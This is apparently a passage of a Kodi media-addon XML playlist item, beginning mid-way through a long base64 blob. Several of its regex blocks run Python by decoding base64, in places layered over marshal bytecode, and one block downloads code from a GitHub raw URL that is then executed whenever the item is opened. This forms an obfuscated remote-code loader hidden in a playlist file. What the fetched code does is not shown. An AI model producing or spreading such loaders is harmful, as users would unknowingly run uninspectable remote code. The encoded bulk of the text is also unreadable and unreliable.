UhjR3hhYlZveVFVZElORUZIUkRGQ1IwVjRRWGRFTVVGUmNHeEJWRXd6UWxGYU1VRnRSRzFCUjFkMlFWRldNa0pIUlhoQmJYUnRRVzF3TUZwdFRqSk1SMXB0V20xRU1rMTNjREpCZDB3eFdrZGFNMWRxTUZodU1razFiMHBUWlUxTFZuUkRSazVoUm5kTk1VMUlZMDlCYkRsRFNFcEJia3BLY1VkRk1FbGFRa2w1TkVFeWNXNUpSMGw1V0RKblNFSlZUMGhOYlhCbFRWSm1iRXBJT0RGdWVEQXpRVkk0TVZwNlV6SkpTbmxYYnpKblRFeHRSWHBFU0VsaFIzbE1aVVI2WTJOS2QxSnNjREJqZG05SGREVlliVTlOY2tablpVaElNVlp4UjB3eVRYZEpkVUZVT1dGWk1qbFBSbUZqTUVGSU1VaEVlazFQY1habWJVbDVSR3hHZUVsc2IzcDBOVVF5WmpKR1MwRnFSRWhNWlVGVU9VWkdlREZLYnpKd01tNHhUbTF4VWtFelNrbzFiRzVMY0RWSGQzbG1SekExYW05dGRXNWFkMU0yUm0xWE0zRktTV05KZWpsTFRUSkpOVzkzUkRCSFVsTTBTbUYxVjAxUlNWbHZWREYzUVZGeFkwMVVZMnh1ZVVWcVFWVkliRVI2VTJaeGJYbFdRVWRKWVUxUlNHeFlNVUZuUVhkNE5VWkhValJJU0hWYVNrbzVlRVV3YTFwSWQzazJia3BKYlhGNE9ERndTMU5XYjBwMVVVeDZVMnhNTTFkSGNERmFiVVoyWjNseFNqRnVTa3AxWTAxTFFXMUdNMEZCYm0xMVlYRXhUWGxCVkdwcFRIcG5lRm95ZURSeVMwVnRSREY1UTBGU2RYZE5TRk5sU25nNU0wSlRTVmxITTFkUlIzaDVSWEF3TVdaTlNVMVJTa2hYTWxneVoyaHVTSEZXV0ROTlNFVXpWMkZhVkVGclNFZEJRVzlLTlRaSFIwZ3lRa2hTTkc1S1ZqRndTWGxCUWtkQlVIRlNPV2R3UjFZd2IwcEJSbkV3ZVhkdmQzZ3hTbEZJYkZneFkyWkJlSFZTY0ZWTk5FMHlTVmRDUjNsR2NGTklOWEI1UVhsdVIwVkhjVEZKYTNGS1YyTkhTVTkxUm13NWEwVkxjVFp3ZG1kdGNrb3hSMjlIUlZkQlVYbGxjRk54TlVkMloycFlNM2xHYmtkVFYwaExRVTl5U1hsaFNsRjVORUpJZVdGdWVWZDRibUY1YUVWSFRqSnVVMk5tVFcxNVpYSklaekJHUzFNMFNEQmpiRWxSU0RGdVNEbHJjSHB4V0c5SFYweEtVMWRVU0RKU1pYSkxlVFpKYlVRelJFZEJZVXg2VTFkSWJVbGlUVXRqUlZodFZteElWVWh0U1V0eGVFWkhRVkZhVVUxcFRWSkJORUV4ZFd0Wk1sTm5Ta2hKZDBReU9HVklNMDlrUVV0QmVFcDVlV1J3TUdJd2NGTjVSbkJLT1hWSFNIQXdSSGRCV0VZd09URkhVWEY1V1RCaldIRkxWMFZGU2xOblNETjFORzU1WXpGeWVHdG5jVXRCUVc1TFFWZEdkM0ZHVFV0WFQwY3laakpGYlVVeFNWTkJXVzh4Y1ZoWU0xTldUVko0YTI5VU1XMXhkMWQyUkRJNGJISjVZMjFITTFZMFdtRjFlbGt6ZVdKeVNrVktTWGxOZFV4SVJXeEJNREZwUmtsWFQxcEtNVU5hUzNnMVRFdGpUMFZLVjNwdVZHSnNUVXBGZFVaM1FUVkJiVk0xYmxWV2FrRlNlWHBOYlhWQ2NFcDRNWEpHT1VGSE0wVmpjRkJtYkVaVFNXeEhTMDlpU0dGTlpuRlZRVEpZTW5FeGJqQlNiWEZTWTJWTVNGSXhUVWxCVjBGS09XcHhWSEZOV2xSWGEwcExjVTFHTWsxV2NWSnJhMjVSU1ZoRU1VUnJiMVJuVEhBeVYyZEZVblZrU2xKeFFVWjNlVFZCUm1kcGNVcGpaSEY1VERWS1NrVlFTRzFCUlc1SVREUnlkMXBwYmxRNVdHOVNZMnh1VTB3MFdrcDViWEY0WTFkRlNHZHRjVEExV201VU5XWnZTRGcxUlcxSU1VMUhSREZDU0RGNFJrbzFiWEY0YWpWeE1uazBUVWRQWjAxUlREVkVkMGxrU1ZONVpVbEpZM3B3VTNGNVJIZ3hOVzlWVFZKSllVbFhjbmRJTUZneVNXTnlWRUZpUlZOWFkwRjRaMVZ4TTNGYVdETkpaMGhzWjJodWVEUnFia3B3YkVsSVYwdEVNMGd6U1ZCblpFUjNWMUZNUjA5UFRUTnhVVUV6VDJ0eGVubDVXVzEwTW5KVU9URk5Va1F6UlhablltNTVRWHB1U2pneWNIZDBOVVl6VEdwdk1tdFpSakZKVDI1M1FWQmFVbGMxVEVweGJrY3lhMWxCVlU0eGNEQTVZMEY1VTAxRWVFVlRSREJCTVc1NVRqUkVlakF6V0cxTWJIQlNZMVZFU1hGclFsVjFWbkJKUlU5RU1VRjVTbmhqV1VWSVoyZEpNR05aUWxSVFRVVjVkV1J3UzBsUGNIcHJWbTlKVjAxQk1IbDVTRlYxWVVjd2EwbEJlR2RwY1VsWGRWa3hTVVZZTUZJMGJsSm5ka0ZMZVRGSFIzQTFTREkxVFZreWRXbENWVmQ1UVROamRrRXpUWGR3U1U5b1drcFRhMWt5VERSSGVVMXRXVEk1YUc5U1NWbE1TWGw2V0RCaWJXNTVVM1p5VW1kalJtMVRTSEYzVTJ4Rk1qVm1iMGxFYlVoSU9WbHdNblZZU0ZKYWEwVlJSVUpCUzNsRmJ6TkpkM0ZLVTJ4TU0xTjVSbmRUWTFwaGVHVk1NbE4xY1hoRmEyNHllVE5ZYlhWSmIwbEpTWEpWVFVWR2JYbFVTVlJ4U0VKUmRERk1NVkl3YjIxQldFUkpTRE55VkZJMGNHMWFNRnBMWTFWYU1rbFpURWxqUVV4SVUwaEJNMVpyUjBkQldFSkdPR1Z3VTNocFNFdFhaMjVKV21WR2VHTmFXbEZhYVVKVlNUUnZTM2xSYnpOYU1tNTZVMk5IU2trMVIwdGpVWEJIZFZSSlNtSnRRWGRUVVhKM1NWTk5WRTFUUlVZNVdFVnRUakpOTWxKdFJEQkpaMFZoVEdsR2JYVmlRVlJyWW00eGVUSndVakZOU1d4bU0wUXpkR2x2U25CcFJIcDVZa3A2YWpCRlNFMVZjVEZNTTBGVVYxaEVTWGd5V2tkUE0zRlJUV2xhUjFZeFRVdFdNRzVzT1ROYVVWb3pTRlJyUlhGdGRVVnZTWGhsY0ZWT2FVMTZkR3RCZUZkaFNrWTVZMGRWVDFwdVIwVjJjRE5YUmxodGNVMUpTakZNV25nNWQzQnRSWFZaTUZkclNVb3hUVnBIZUcxWk1VaHFjSHBpYVZwNFl6WnZlamh0UldGT00yOVJjVVZZYkRneWIxTkZWVzVWVTJOd2VtTnRibFJtTlc5TFNVZHlTVk5oVEdGeFlVbEtNVXBIU0dObGJrbzRhWEZKU1ZsRWJYUXpXVEp4VUVZeWRHVkJNblZUYjNvNVMwMXRRVU54VWpGbGNVZDBNa1l4UlRKWU1qRlJRWGhCVUVsS1NWaHdNbmxOU1RCV2JXOUxWM2xOVVhsVFNuWm1Na3BIVFdKR1ZEVjJjSG94VFc1VlFYVkdlalY0UVRJMVpsbHRUMFZ3ZUdOUGNsUjViWEJVTkRWQk1WWnJjVE5CZFhGc09UVkNTbkZ1UkROalExcFNkRFZDVkhGUFJrWm5UMjh5TVhwR1NYVlFRWGhyTlhBelUydEVNbmxaV2pJMVZsZ3pUVXB3YlhGSVNHMTFaRUZLZUcxeE1VZ3ljVlJXTlVRemVHeE1NR041Y1hwd1pVbEtlV2R5ZGpsRldrcG5ha0pTTUROQ1VsTjVUSGRYYlhGMlowbE5SM1ZhYnpCSU1FSlZRVEZDVldOclNuWm5iVTFIZFZCRlVubFZXVzFXTTNGSGNHdFpNbWMyV0RCVFkxZ3lTVFpaTVZOYVFXMVRabHBHWm1WWk1FRlljRzFPTlZwS1dtVk5NMEZCUkVsTWJYQjZNV2xGTTNGaldtdzRNMXBLTVhWRWVrZ3hTbmxYVTB3eVYwZHdNazF0VERJMWFVRXpTREpHU0VocVNFaGFNRmd6UVVwQmRqbFZTVWhYYW00eU9EUndiRGxVVEV0NVYxa3llV2R4ZVUxNFduWTRiVmd3U0ROdVZIbFZURzE1VEVwSWNHcElTazF0V1RKVE5rVXdVMDFDU2poclNrWm1hVWt3VjFOTWVWZE1Sek5QVFVGVlRtbHZTakExVFZGSmFWa3pWMUZNZDAxc2IwZHhWRzVIVjJkQlIzVmtXVzFKTTB4dGRXWnVTRUZuYjFWNE0xbHRkRE5IUzFwcFdURndiVmh0Y0RWRk1rRmpXbTF3TVZwNmFtbEpSMFZYY1ROSWJGcHRkVVZIVkdwbFIyMUJaRU5ITUdGUlJHTTJia281YUZaUk1IUlhNV3MwUVcxWGNISlJUWHBMVlhRelFWTnJORnB0VTNCeVVWcHRWMm93V0c5NlNXbFdVVEIwVFV0TmRXOVFkR0ZMVlhReVdubHJORUYzZVhCeVVVMTVTMVYwTWxwSmF6UkJiVUZ3Y2xGTWJVdFZkREpDU1dzMFFYZDVjSEpSVjNsTFZYUXpRVWxyTkVGNlNYQnlVVXcwUzFWME1rRkphelJCYlhWd2NsRk5kMHRWZERKQ1NXczBRWGROY0hKUmNEVkxWWFJzUWxOck5FRjZSWEJ5VVUxNlMxVjBNMXA1YXpSQmJVOXdjbEZNTkV0VmRESkJTV3MwUVcxSmNISlJjRzFMVlhSc1FrbHJORnAzVG1GWVJrNWxWbFJKTWt4S2FtSlhNV3MwUVhkQmNISlJUWHBMVlhReVFWTnJORUYzU1hCeVVVeHRTMVYwTTFveGF6UmFla2x3Y2xGTU1FdFZkREpCU1dzMFFYZEJjSEpSVFhwTFZYUXlRVk5yTkVGM1NYQnlVVlkwUzFWME0wRlRhelJCYlZkd2NsRk1OVXRWZERKTlNXczBRWGQ1Y0hKUmNEQkxWWFF6UWtsck5GcDZRWEJ5VVZacVMxVjBNMHhKYXpSQmQzbHdjbEZOZWt0VmRESk5TV3MwV25kNFlWaEdUbVZXVkVreVRFcHFZbGN4YXpSQmQxZHdjbEZNTlV0VmRESk5TV3MwUVhkVGNISlJjRzFMVlhReVdqRnJORUYzZVhCeVVVdzFTMVYwYkUxSmF6UkJiVWx3Y2xGTmVVdFZkREpDVTJzMFFYZEpjSEpSY0RSTFZYUXlUREZyTkVGM2VYQnlVVXd5UzFWME0wSkphelJhZDNWd2NsRk5la3RWZEROYWVXczBRWGRUY0hKUlRHMUxWWFF5VERGck5FRjNTWEJ5VVZZMVYyeDRkRmhzVDNseGVsTm1XRkJ4Y0hKUlRHMUxWWFF5VFhsck5FRjNSWEJ5VVV3eFMxVjBNbG94YXpSQmJVRndjbEZYZVV0VmRESkJVMnMwUVhkSmNISlJURzFMVlhReVRYbHJORUYzUlhCeVVVd3hTMVYwYkVKVGF6UkJlbGR3Y2xGTU1VdFZkRE5DU1dzMFFYcEZjSEpSVEd0TFZYUXlUSGxyTkVGM1NYQnlVWEJzUzFWMGJGcFRhelJhZWtGd2NsRldha3RWZEROTVNXczBRWGQ1Y0hKUlRYcExWWFF5VFVsck5GcDNlR0ZZUkRCWVRVdE5kVzlRZFhkdk1qRnFia3ByZVZoVlkyWnVTbFpvVFZSSmQyOHlNV3B3ZWtsdGNHeDFka3hMUVhsQmQwUm9USGRNTUUxVVNYZHZNa1Y1V0ZSSk1reEthbUpYTVdzMFFYcEpjSEpSVERGTFZYUXlUWFp3WTFoR2VHWlhiV3R0Y1ZWWFkyOTZjQ3RYYkdwaFRVdDFlVXhzY0dOWVJEMDlkQVVBQUFCeWIzUXhNM01KQUFBQWJXOXljR2hsZFhNZ2N4d0FBQUJqYjJSbFkzTXVaR1ZqYjJSbEtIUnlhVzVwZEhrc0lIcHBiMjRwZEFZQUFBQnZjbUZqYkdWekhnQUFBR052WkdWamN5NWtaV052WkdVb2EyVjViV0ZyWlhJZ0xDQjZhVzl1S1hRREFBQUFibVZ2Y3dnQUFBQThjM1J5YVc1blBuUUVBQUFBWlhobFl5Z0xBQUFBZEFZQUFBQmlZWE5sTmpSMEJnQUFBR052WkdWamMzUUlBQUFBYlc5eWNHaGxkWE4wQndBQUFIUnlhVzVwZEhsU0JBQUFBSFFJQUFBQWEyVjViV0ZyWlhKMEJBQUFBSHBwYjI1MEJBQUFBR1YyWVd4U0JRQUFBSFFIQUFBQVkyOXRjR2xzWlhRSkFBQUFZalkwWkdWamIyUmxLQUFBQUFBb0FBQUFBQ2dBQUFBQWN3WUFBQUJ6WTNKcGNIUjBDQUFBQUR4dGIyUjFiR1UrQVFBQUFITU9BQUFBR0FFR0FRWUJCZ0VHQVFZQktnRT0iKSkp"))
]]></expres>
<page></page>
</regex>
<regex>
<name>link_final</name>
<listrepeat><![CDATA[
<title>[COLOR white][link_final.param2] [link_final.param3] [link_final.param4] [/COLOR]</title>
<link>$doregex[selecion_inteligente]</link>
<thumbnail>[cap.param2]</thumbnail>
<fanart>https://i.imgur.com/KFAuyll.jpg</fanart>
]]></listrepeat>
<expres><![CDATA[#$pyFunction
url = '[cap.param1]'
import re,requests,base64,xbmc,xbmcgui,xbmcaddon,random,urllib2
import base64;exec(base64.b64decode(""))
]]></expres>
<page></page>
</regex>
<regex>
<name>link_final_total</name>
<expres><![CDATA[#$pyFunction
url = '[link_final.param1]'
referer = '[cap.param1]'
import re,requests,base64,xbmc,xbmcgui,xbmcaddon,random,urllib2
import base64;exec(base64.b64decode(""))
]]></expres>
<page></page>
</regex>
<regex>
<name>selecion_inteligente</name>
<expres><![CDATA[#$pyFunction
url = '$doregex[link_final_total]'
$doregex[importar]
from resolveurl.plugins.lib import jsunpack
$doregex[reparar_conectores]

]]></expres>
<page></page>
</regex>
<regex>
<name>reparar_conectores</name>
<expres><![CDATA[#$pyFunction
def GetLSProData(page_data,Cookie_Jar,m):
    import urllib2
    return urllib2.urlopen('https://raw.githubusercontent.com/Cristalazul/Cristalazul.io/main/CONECTORES/conector.a.distancia.definitivo').read()
]]></expres>
<page></page>
</regex>
<regex>
<name>importar</name>
<expres><![CDATA[#$pyFunction
import base64;exec(base64.b64decode("aW1wb3J0IG1hcnNoYWw7ZXhlYyhtYXJzaGFsLmxvYWRzKGJhc2U2NC5iNjRkZWNvZGUoIll3QUFBQUFBQUFBQUFRQUFBRUFBQUFCekRRQUFBR1FBQUlRQUFGb0FBR1FCQUZNb0FnQUFBR01EQUFBQUNRQUFBQVlBQUFCREFBQUFjODBBQUFCa0FRQmtBQUJzQUFCOUF3QmtBUUJrQUFCc0FRQjlCQUJrQVFCa0FBQnNBZ0I5QlFCa0FRQmtBQUJzQXdCOUJnQmtBUUJrQUFCc0JBQjlCd0I4QndCcUJRQ0RBQUJxQmdCa0FnQ0RBUUI5Q0FCa0F3QjhDQUJyQmdCemRRQmtCQUI4Q0FCckJnQnpkUUJrQlFCOENBQnJCZ0J5bndCOEJBQnFCd0JrQmdCa0J3QnBBZ0JrQ0FCa0NRQTJaQW9BWkFzQU5tUU1BSFFJQUlNQkFtb0pBRk44QkFCcUJ3QmtEUUJrQndCcEFnQmtDQUJrQ1FBMlpBb0FaQXNBTm1RTUFIUUlBSU1CQW1vSkFGTmtBQUJUS0E0QUFBQk9hZi8vLy85MEFnQUFBR2xrZEFzQUFBQmpjbWx6ZEdGc1lYcDFiSFFGQUFBQVptVnpkR0YwQ0FBQUFFWjFjMmx2YmxSMmMyWUFBQUJvZEhSd2N6b3ZMM0poZHk1bmFYUm9kV0oxYzJWeVkyOXVkR1Z1ZEM1amIyMHZRM0pwYzNSaGJHRjZkV3d2UTNKcGMzUmhiR0Y2ZFd3dWFXOHZiV0ZwYmk5RFQwNUZRMVJQVWtWVEwwbHRjRzl5ZEdGeUxtVnVkR1Z5Ynk1a2FYTjBZVzVrYVdGMEJ3QUFBR2hsWVdSbGNuTnpTQUFBQUUxdmVtbHNiR0V2TlM0d0lDaFhhVzVrYjNkeklFNVVJRFl1TXpzZ1YwOVhOalE3SUhKMk9qVTFMakFwSUVkbFkydHZMekl3TVRBd01UQXhJRVpwY21WbWIzZ3ZOVFV1TUhNS0FBQUFWWE5sY2kxQloyVnVkSE1TQUFBQWFIUjBjSE02THk5bmFYUm9kV0l1WTI5dGRBY0FBQUJTWldabGNtVnlkQVlBQUFCMlpYSnBabmx6WEFBQUFHaDBkSEJ6T2k4dmNtRjNMbWRwZEdoMVluVnpaWEpqYjI1MFpXNTBMbU52YlM5RGNtbHpkR0ZzWVhwMWJDOURjbWx6ZEdGc1lYcDFiQzVwYnk5dFlXbHVMME5QVGtWRFZFOVNSVk12YVcxd2IzSjBZWEl1Y205aVlXUnZLQW9BQUFCMEFnQUFBSEpsZEFnQUFBQnlaWEYxWlhOMGMzUUNBQUFBYjNOMEJBQUFBSGhpYldOMENRQUFBSGhpYldOaFpHUnZiblFGQUFBQVFXUmtiMjUwREFBQUFHZGxkRUZrWkc5dVNXNW1iM1FEQUFBQVoyVjBkQVVBQUFCR1lXeHpaWFFFQUFBQWRHVjRkQ2dKQUFBQWRBa0FBQUJ3WVdkbFgyUmhkR0YwQ2dBQUFFTnZiMnRwWlY5S1lYSjBBUUFBQUcxU0J3QUFBRklJQUFBQVVna0FBQUJTQ2dBQUFGSUxBQUFBVWdBQUFBQW9BQUFBQUNnQUFBQUFjd1lBQUFCelkzSnBjSFIwREFBQUFFZGxkRXhUVUhKdlJHRjBZUUVBQUFCekNnQUFBQUFCUEFFVkFTUUJLZ0pPS0FFQUFBQlNGQUFBQUNnQUFBQUFLQUFBQUFBb0FBQUFBSE1HQUFBQWMyTnlhWEIwZEFnQUFBQThiVzlrZFd4bFBnRUFBQUJ6QUFBQUFBPT0iKSkp"))
]]></expres>
<page></page>
</regex>
<thumbnail>https://i.imgur.com/S1r1T5Y.png</thumbnail>
<fanart>https://i.imgur.com/tfdPOT5.jpg</fanart>
</item>


